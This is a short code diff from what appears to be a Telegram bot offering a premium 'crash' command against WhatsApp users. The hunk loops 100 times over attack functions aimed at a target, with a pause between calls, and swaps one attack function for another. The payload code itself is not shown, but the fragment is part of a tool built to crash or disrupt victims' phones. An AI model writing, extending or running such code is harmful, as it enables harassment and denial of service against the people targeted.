@@ -2572,7 +2572,7 @@ bot.command("FaiqxRaraCrashInvis", checkWhatsAppConnection, checkPremium, checkC
 
     for (let i = 0; i < 100; i++) {
    await FriendBerulah(sock, target);
-   await FaiqCrashInvis(sock, target);
+   await FriendBerulah(sock, target);
    await sleep(5000);
   }
 
